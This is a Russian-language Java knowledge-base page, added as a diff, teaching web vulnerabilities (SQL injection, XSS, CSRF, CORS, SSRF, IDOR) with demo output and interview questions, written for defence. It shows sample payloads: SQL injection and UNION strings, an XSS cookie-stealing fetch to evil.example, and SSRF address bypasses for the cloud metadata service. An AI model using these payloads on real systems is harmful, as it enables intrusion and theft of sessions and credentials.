@@ -1,0 +1,232 @@
+<!doctype html>
+<html lang="ru">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Web Vulnerabilities · Java KB</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,400;0,500;0,600;0,700;1,400&amp;display=swap">
+<link rel="stylesheet" href="../assets/kb.css">
+<script src="../assets/topics.js"></script>
+<script src="../assets/search.js"></script>
+</head>
+<body data-page="topic" data-root="../" data-topic="web-security">
+
+<main class="page">
+  <header class="topic-head">
+    <h1>Web Vulnerabilities</h1>
+  </header>
+
+  <div class="lesson">
+    <div class="note tip">
+      <p>Большинство веб-уязвимостей — одна ошибка в разных местах: данные от пользователя попадают туда, где их считают кодом или командой. В SQL — инъекция, в HTML — XSS, в адрес исходящего запроса — SSRF. Защита — разделять данные и код: параметры запроса вместо склейки, экранирование под конкретный контекст, проверка адреса после разрешения имени. Вторая группа — запросы, которые браузер отправляет от имени пользователя: CSRF закрывают SameSite и CSRF-токен, а CORS ослабляет защиту браузера и от CSRF не спасает. Первое место в OWASP Top 10 — ошибки контроля доступа, которые не ловит ни один фреймворк.</p>
+    </div>
+
+    <section class="step" id="why">
+      <h2>Атакующему не нужно ломать шифрование, если приложение само выполнит его ввод</h2>
+      <p>Отчёты пентестеров платёжных систем похожи друг на друга. Поиск по магазину подставляет строку в SQL. Комментарий к платежу выводится в админке как HTML. Загрузка логотипа по URL позволяет серверу сходить на внутренний адрес облака и забрать ключи. Ручка <code>/payments/{id}</code> отдаёт чужие платежи, если подставить другой id. Ни в одном случае не взламывали криптографию: приложение само выполнило то, что прислал атакующий.</p>
+      <p>OWASP Top 10 — список самых распространённых классов уязвимостей. В редакции 2025 года первые места — нарушение контроля доступа, ошибки конфигурации и атаки на цепочку поставок зависимостей; инъекции на пятом месте, SSRF вошёл в контроль доступа. Тема разбирает механику главных атак и защит. Как Spring Security включает CSRF и CORS, разобрано в <a href="spring-security.html">Architecture</a>, правила доступа — в <a href="spring-authz.html">Authorization</a>. Демо <a href="../examples/security-basics/WebVulnDemo.java">WebVulnDemo.java</a> работает с настоящей H2 2.5 в памяти: <code>mvn -q dependency:build-classpath -Dmdep.outputFile=target/classpath.txt</code>, затем <code>java -cp "$(cat target/classpath.txt)" WebVulnDemo.java</code>.</p>
+    </section>
+
+    <section class="step" id="sqli">
+      <h2>SQL-инъекция: строка пользователя становится частью запроса</h2>
+      <p>Поиск платежей магазина собирает SQL склейкой строк. Атакующий вводит не id магазина, а кусок SQL:</p>
+      <pre><code class="language-java">String input = "m-7' OR '1'='1";
+"select id, amount from payment where merchant = '" + input + "'";   // Склейка.
+
+String union = "x' UNION SELECT 0, password_hash FROM app_user --";    // Чужая таблица.
+
+var ps = db.prepareStatement("select id, amount from payment where merchant = ?");
+ps.setString(1, input);                                                 // Значение отдельно от текста.</code></pre>
+      <pre class="out">== sql injection
+concat:   [1:500, 2:700, 3:90000, 4:12000]
+union:    Data conversion error converting "$2a$12$Q9..."; SQL statement:
+prepared: []</pre>
+      <p>Кавычка во вводе закрыла строковый литерал, а <code>OR '1'='1'</code> сделал условие истинным для всех строк: магазин m-7 увидел платежи m-9. Второй ввод присоединил запрос к таблице пользователей. Типы колонок не совпали, и запрос упал — но текст ошибки содержит хеш пароля администратора. Если приложение отдаёт текст исключения клиенту, это готовый канал утечки: так работает error-based инъекция. Даже без текста ошибок данные вытаскивают по одному биту через разницу в ответах или во времени (blind SQLi).</p>
+      <p>С <code>PreparedStatement</code> строка уходит в базу отдельно от текста запроса, и база никогда не разбирает её как SQL: платежей магазина с именем <code>m-7' OR '1'='1</code> нет. Экранирование кавычек вручную — плохая замена: в разных базах и кодировках свои правила. Параметризовать нельзя имена колонок, таблиц и направление сортировки, их берут из белого списка, как в <a href="api-practices.html">API Design</a>. JPA не защищает автоматически: склейка в JPQL или нативном запросе даёт ту же инъекцию.</p>
+    </section>
+
+    <section class="step" id="xss">
+      <h2>XSS: экранировать нужно под контекст, куда попадают данные</h2>
+      <p>Комментарий к платежу выводится оператору поддержки в админке. Атакующий оставляет комментарий с HTML, и браузер оператора выполняет его скрипт с правами оператора:</p>
+      <pre class="out">== xss
+raw:         &lt;p&gt;&lt;img src=x onerror=fetch('//evil.example/?c='+document.cookie)&gt;&lt;/p&gt;
+html-escape: &lt;p&gt;&amp;lt;img src=x onerror=fetch(&amp;#39;//evil.example/?c=&amp;#39;+document.cookie)&amp;gt;&lt;/p&gt;
+href, escaped but unsafe: &lt;a href="javascript:fetch(&amp;#39;//evil.example/?c=&amp;#39;+document.cookie)"&gt;site&lt;/a&gt;
+href, scheme allow-list:  rejected (scheme javascript)</pre>
+      <p>Экранирование превращает <code>&lt;</code> в <code>&amp;lt;</code>, и браузер показывает тег как текст. Но правильное экранирование зависит от места. Ссылка на сайт магазина прошла HTML-экранирование и осталась опасной: в атрибуте <code>href</code> схема <code>javascript:</code> выполнит код по клику, и кавычки тут ни при чём. Для URL проверяют схему по белому списку, внутри <code>&lt;script&gt;</code> нужно JavaScript-экранирование, в CSS — своё. Шаблонизаторы вроде Thymeleaf экранируют HTML по умолчанию, а React — при выводе текста, поэтому XSS обычно появляется там, где экранирование выключили: <code>th:utext</code>, <code>dangerouslySetInnerHTML</code>, сборка HTML строкой.</p>
+      <p>Если разметку от пользователя нужно сохранить, её не экранируют, а очищают санитайзером по белому списку тегов, например OWASP Java HTML Sanitizer. Второй рубеж — Content Security Policy: заголовок <code>Content-Security-Policy: script-src 'self'</code> запрещает браузеру выполнять inline-скрипты и скрипты с чужих доменов, и даже пропущенная инъекция не исполнится. Cookie сессии с HttpOnly XSS не прочитает, но скрипт всё равно может делать запросы от имени пользователя, пока страница открыта.</p>
+    </section>
+
+    <section class="step" id="csrf">
+      <h2>CSRF: браузер отправляет cookie с чужой страницы, и CORS этого не запрещает</h2>
+      <p>Оператор залогинен в админке <code>admin.pay.example</code>. В соседней вкладке он открывает страницу атакующего, на которой скрытая форма отправляет POST на <code>admin.pay.example/payouts</code>. Браузер прикладывает cookie сессии к запросу на её сайт, кто бы ни инициировал запрос, — и выплата уходит. Это CSRF, подделка межсайтового запроса.</p>
+      <figure class="fig">
+        <div class="fig-box">
+          <svg class="dg" viewBox="0 0 720 250" role="img" aria-label="Страница evil.example отправляет POST на admin.pay.example. Без SameSite браузер прикладывает cookie, сервер выполняет выплату. Политика одного источника запрещает только прочитать ответ, но запрос уже выполнен. С SameSite=Lax cookie в межсайтовый POST не попадает, и сервер видит анонимный запрос.">
+            <defs>
+              <marker id="cs-n" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" class="dg-arrow"/></marker>
+              <marker id="cs-bad" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" class="dg-arrow bad"/></marker>
+              <marker id="cs-ok" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" class="dg-arrow ok"/></marker>
+            </defs>
+            <rect x="20" y="40" width="170" height="176" rx="9" class="dg-box"/>
+            <rect x="530" y="40" width="170" height="176" rx="9" class="dg-box"/>
+            <g text-anchor="middle">
+              <text x="105" y="64" class="dg-in">evil.example</text>
+              <text x="105" y="84" class="dg-n">в браузере оператора</text>
+              <text x="615" y="64" class="dg-in">admin.pay.example</text>
+            </g>
+            <text x="200" y="28" class="dg-cap bad">БЕЗ SAMESITE</text>
+            <path d="M190 100 L 526 100" class="dg-line bad" marker-end="url(#cs-bad)"/>
+            <text x="210" y="92" class="dg-bad">POST /payouts + Cookie: SID</text>
+            <text x="542" y="106" class="dg-bad">выплата ушла</text>
+            <path d="M526 120 L 194 120" class="dg-line"/>
+            <text x="210" y="136" class="dg-n">ответ прочитать нельзя — но уже поздно</text>
+            <text x="200" y="168" class="dg-cap">SAMESITE=LAX</text>
+            <path d="M190 200 L 526 200" class="dg-line ok" marker-end="url(#cs-ok)"/>
+            <text x="210" y="192" class="dg-ok">POST /payouts, cookie не приложена</text>
+            <text x="542" y="196" class="dg-ok">401, анонимный</text>
+            <text x="20" y="242" class="dg-s">Политика одного источника защищает ответ, а не сам запрос.</text>
+          </svg>
+        </div>
+        <figcaption>CORS решает обратную задачу: разрешает чужим страницам читать ответы. Неправильно настроенный CORS не создаёт CSRF, но добавляет к нему чтение данных.</figcaption>
+      </figure>
+      <p>Политика одного источника (same-origin policy) запрещает странице читать ответы чужого сайта, но не запрещает отправлять ему простые запросы: формы, картинки, GET и POST с обычными типами содержимого. Поэтому защита от CSRF — на стороне сервера. <code>SameSite=Lax</code> не даёт браузеру приложить cookie к межсайтовым POST; CSRF-токен — случайное значение в форме или заголовке, которое чужая страница не может узнать. Для API с токеном в заголовке Authorization CSRF не страшен: браузер не прикладывает такой заголовок сам.</p>
+      <p>CORS — способ ослабить политику одного источника: сервер заголовком <code>Access-Control-Allow-Origin</code> разрешает конкретным доменам читать свои ответы. Для запросов с нестандартными заголовками или методами браузер сначала отправляет preflight-запрос OPTIONS. Опасная настройка — отражать в ответе любой присланный <code>Origin</code> вместе с <code>Access-Control-Allow-Credentials: true</code>: тогда любой сайт читает ответы от имени залогиненного пользователя. Сочетание <code>*</code> с credentials браузер запрещает, поэтому ошибку «чинят» отражением и получают уязвимость.</p>
+    </section>
+
+    <section class="step" id="ssrf">
+      <h2>SSRF: сервер сам идёт по адресу из запроса, в том числе во внутреннюю сеть</h2>
+      <p>Магазин указывает URL логотипа, и платёжный сервис скачивает картинку. Атакующий указывает <code>http://169.254.169.254/latest/meta-data/</code> — адрес сервиса метаданных облака, доступный только изнутри. Сервер послушно сходит туда и вернёт временные ключи доступа к облачному аккаунту. Наивная защита проверяет строку хоста, а у адреса много записей:</p>
+      <pre><code class="language-java">// Наивно: запрет по строке хоста.
+host.startsWith("169.254.") || host.equals("localhost") || host.startsWith("127.")
+
+// Строго: только https:443, затем разрешить имя и проверить каждый адрес.
+for (InetAddress a : InetAddress.getAllByName(u.getHost()))
+    if (a.isLoopbackAddress() || a.isLinkLocalAddress() || a.isSiteLocalAddress() || a.isAnyLocalAddress()) ...</code></pre>
+      <pre class="out">== ssrf
+https://example.com/logo.png               naive=allowed  strict=allowed
+https://169.254.169.254/latest/meta-data/  naive=blocked  strict=blocked (169.254.169.254)
+https://2852039166/latest/meta-data/       naive=allowed  strict=blocked (169.254.169.254)
+https://[::ffff:127.0.0.1]/                naive=allowed  strict=blocked (127.0.0.1)
+https://localtest.me/                      naive=allowed  strict=blocked (127.0.0.1)
+http://localhost:8080/actuator/env         naive=blocked  strict=blocked (scheme/port)</pre>
+      <p>Число 2852039166 — тот же 169.254.169.254, записанный одним десятичным числом. IPv6-форма <code>::ffff:127.0.0.1</code> — это loopback. Публичное имя <code>localtest.me</code> разрешается в 127.0.0.1. Строковые проверки пропустили все три, проверка после разрешения имени — нет. Но и она не последний рубеж: между проверкой и запросом DNS может ответить иначе (DNS rebinding), поэтому соединяться нужно с тем адресом, который проверили, а редиректы — запретить или проверять каждый.</p>
+      <p>Надёжнее всего, чтобы исходящие запросы по адресам от пользователей шли через отдельный прокси без доступа во внутреннюю сеть, а сервис метаданных облака требовал токен сессии, как IMDSv2 в AWS. Белый список доменов, если он возможен, лучше любых чёрных списков.</p>
+    </section>
+
+    <section class="step" id="access">
+      <h2>Первое место — контроль доступа, и его проверяет только сам код</h2>
+      <p><code>GET /payments/p-1042</code> возвращает платёж, если пользователь залогинен. Магазин m-7 меняет id в адресе и читает платежи m-9. Это IDOR — небезопасная прямая ссылка на объект, самая частая уязвимость из первой категории OWASP. Фреймворк проверил, что пользователь аутентифицирован и имеет роль merchant, но не может знать, что платёж p-1042 принадлежит другому магазину. Проверка владения — в коде: запрос <code>where id = ? and merchant_id = ?</code> или явная проверка после загрузки, о чём подробно в <a href="spring-authz.html">Authorization</a>. Непредсказуемые UUID вместо последовательных id усложняют перебор, но проверку не заменяют.</p>
+      <p>Вторая категория — ошибки конфигурации: открытые <code>/actuator/env</code> и <code>/v3/api-docs</code>, стектрейсы в ответах, отладка в проде, ключи по умолчанию. Третья — зависимости: уязвимость в библиотеке, как Log4Shell, или вредоносный пакет. Их ловят сканированием зависимостей в CI, фиксацией версий и проверкой целостности артефактов.</p>
+      <div class="trap">
+        <p class="myth">Мы используем Spring Security и ORM, значит, от OWASP Top 10 защищены.</p>
+        <p class="fact">Фреймворк закрывает механику: параметризует запросы JPA, экранирует шаблоны, включает CSRF-защиту. Он не знает, чей платёж, не мешает склеить нативный SQL, вывести th:utext или скачать URL из запроса. Первое место списка — контроль доступа, и его пишет разработчик.</p>
+      </div>
+    </section>
+
+    <div class="summary">
+      <ul>
+        <li>Инъекции — данные стали кодом. SQL: PreparedStatement; в демо склейка отдала чужие платежи, а текст ошибки — хеш пароля.</li>
+        <li>XSS: экранирование под контекст, проверка схемы URL, санитайзер для разметки, CSP вторым рубежом.</li>
+        <li>CSRF: браузер прикладывает cookie к чужим запросам; SameSite и CSRF-токен. CORS разрешает чтение ответов и от CSRF не защищает.</li>
+        <li>SSRF: проверять адрес после разрешения имени, соединяться с проверенным адресом, не следовать редиректам.</li>
+        <li>Контроль доступа к конкретному объекту — в коде; конфигурация и зависимости — отдельные категории риска.</li>
+      </ul>
+    </div>
+  </div>
+
+  <section class="interview" id="interview">
+    <h2>На собеседовании</h2>
+
+    <article class="q" id="websec-sqli" data-freq="3">
+      <h3>Как работает SQL-инъекция и как от неё защититься?</h3>
+      <div class="answer">
+        <div data-level="middle">
+          <p>Ввод пользователя вклеивается в текст SQL, и кавычка во вводе завершает литерал: дальше идёт код атакующего — OR '1'='1', UNION с чужой таблицей, вызов функций. Защита — PreparedStatement с параметрами: значение передаётся отдельно от текста и никогда не разбирается как SQL. Имена колонок и направление сортировки параметризовать нельзя, их берут из белого списка.</p>
+        </div>
+        <div data-level="senior">
+          <ul>
+            <li>Текст исключений не отдают клиенту: error-based инъекция выносит данные в сообщении об ошибке.</li>
+            <li>Blind-инъекция достаёт данные по разнице в ответах или во времени выполнения.</li>
+            <li>JPA защищает только параметры; склейка в JPQL и нативных запросах уязвима. Учётка приложения в базе — с минимальными правами.</li>
+          </ul>
+        </div>
+      </div>
+    </article>
+
+    <article class="q" id="websec-csrf-cors" data-freq="3">
+      <h3>Что такое CSRF и как он связан с CORS?</h3>
+      <div class="answer">
+        <div data-level="middle">
+          <p>CSRF — страница атакующего отправляет запрос на сайт, где пользователь залогинен, и браузер сам прикладывает cookie сессии. Политика одного источника запрещает прочитать ответ, но не отправить запрос. Защита — SameSite=Lax или Strict для cookie и CSRF-токен в формах и заголовках.</p>
+          <p>CORS — способ разрешить чужим доменам читать ответы. Он ослабляет защиту, а не усиливает, и от CSRF не спасает: простые запросы уходят без preflight.</p>
+        </div>
+        <div data-level="senior">
+          <ul>
+            <li>API с токеном в Authorization не подвержен CSRF: браузер не прикладывает заголовок сам.</li>
+            <li>Отражение любого Origin вместе с Allow-Credentials даёт любому сайту чтение данных пользователя.</li>
+            <li>SameSite считает поддомены одним сайтом, поэтому захваченный поддомен обходит его.</li>
+          </ul>
+        </div>
+      </div>
+      <div class="check">
+        <details data-kind="ревью">
+          <summary>Что не так с этим CORS-фильтром?</summary>
+          <pre><code class="language-java">String origin = request.getHeader("Origin");
+response.setHeader("Access-Control-Allow-Origin", origin);
+response.setHeader("Access-Control-Allow-Credentials", "true");</code></pre>
+          <p>Фильтр разрешает любому сайту читать ответы с cookie пользователя: страница атакующего делает fetch с credentials и получает платежи и профиль жертвы. Нужен явный белый список доменов, а для чужих Origin заголовки не выставляются; в Spring — CorsConfiguration со списком allowedOrigins.</p>
+        </details>
+      </div>
+    </article>
+
+    <article class="q" id="websec-xss" data-freq="2">
+      <h3>Как защититься от XSS?</h3>
+      <div class="answer">
+        <div data-level="middle">
+          <p>Экранировать вывод под контекст: в HTML-тексте и атрибутах — HTML-сущности, в URL — проверка схемы по белому списку, внутри скриптов — JavaScript-экранирование. Использовать шаблонизаторы с экранированием по умолчанию и не обходить его. Разметку от пользователей пропускать через санитайзер.</p>
+        </div>
+        <div data-level="senior">
+          <ul>
+            <li>CSP без unsafe-inline запрещает выполнение внедрённых скриптов — второй рубеж.</li>
+            <li>HttpOnly защищает cookie, но не запросы, которые скрипт делает от имени пользователя.</li>
+            <li>Stored XSS в админке опаснее всего: код выполняется с правами оператора.</li>
+          </ul>
+        </div>
+      </div>
+    </article>
+
+    <article class="q" id="websec-ssrf" data-freq="2">
+      <h3>Что такое SSRF и почему проверка по строке хоста не работает?</h3>
+      <div class="answer">
+        <div data-level="middle">
+          <p>Сервер делает запрос по адресу из ввода пользователя и попадает во внутреннюю сеть: сервис метаданных облака, админки, базы. Проверка строки хоста обходится другими записями адреса: десятичным числом, IPv6-формой, публичным именем, которое разрешается во внутренний адрес. Проверять нужно разрешённые IP-адреса и разрешать только нужные схемы и порты.</p>
+        </div>
+        <div data-level="senior">
+          <ul>
+            <li>DNS rebinding: соединяться с адресом, который проверили, а не разрешать имя повторно.</li>
+            <li>Редиректы запрещать или проверять каждый.</li>
+            <li>Изоляция: исходящий прокси без доступа во внутреннюю сеть, IMDSv2 в AWS.</li>
+          </ul>
+        </div>
+      </div>
+    </article>
+  </section>
+
+  <div class="qa"></div>
+  <div class="refs">
+    <ul>
+      <li><a href="https://owasp.org/Top10/2025/">OWASP Top 10:2025</a> — основа урока: категории и их порядок.</li>
+      <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html">OWASP: SQL Injection Prevention</a>, <a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html">XSS Prevention</a> и <a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html">CSRF Prevention</a>.</li>
+      <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html">OWASP: SSRF Prevention Cheat Sheet</a> — обходы проверок адреса и изоляция.</li>
+      <li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS">MDN: Cross-Origin Resource Sharing</a> — preflight, credentials и Allow-Origin.</li>
+    </ul>
+  </div>
+</main>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="../assets/kb.js"></script>
+</body>
+</html>
